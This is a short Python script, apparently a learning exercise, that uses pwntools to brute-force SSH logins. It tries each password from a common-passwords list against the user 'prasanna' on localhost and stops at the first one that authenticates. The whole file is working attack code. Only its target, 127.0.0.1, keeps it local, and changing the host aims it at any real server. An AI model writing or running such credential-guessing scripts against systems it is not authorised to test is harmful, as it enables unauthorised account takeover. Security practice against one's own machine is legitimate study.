#ssh login brute forcing

from pwn import *
import paramiko      # for error handling

host = "127.0.0.1"     # brute forcing against local host
username = "prasanna"
attempts = 0            # for keeping log of number of attempts we have made

with open("ssh-common-passwords.txt", "r") as password_list:    # read the given file for password brute-forcing
	for password in password_list:       # iterate over each password
		password = password.strip("\n")     # strip any white spaces and new line (clean the password up)
		try:
			print("[{}] Attempting password: '{}'!".format(attempts, password))
			response = ssh(host=host, user=username, password=password, timeout=1)     # use ssh from pwntools module to make a ssh connection using a password
			if response.connected():     # check if response has authenticated connection
				print("[>] Valid password found: '{}'!".format(password))
				response.close()      # if the password is correct, we stop guessing passwords
				break
			response.close()    # if the password is not correct, we close the connection and try all over again in the iteration
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		finally:
			attempts += 1